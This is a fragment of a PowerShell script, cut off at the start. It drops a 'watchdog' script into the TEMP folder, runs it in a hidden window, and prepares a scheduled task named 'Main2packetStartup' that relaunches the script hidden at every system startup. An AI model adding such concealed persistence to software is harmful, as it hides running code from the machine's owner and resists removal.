    Start-Sleep -Milliseconds 500
}
"@
$watchdog1 | Out-File "$env:TEMP\watchdog_main.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\watchdog_main.ps1`""

$watchdog2 = @"
`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File `"$using:PSCommandPath`""
`$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "Main2packetStartup" -Action `$action -Trigger `$trigger -Force
"@
$watchdog2 | Out-File "$env:TEMP\watchdog_startup.ps1" -Encoding UTF8 -Force
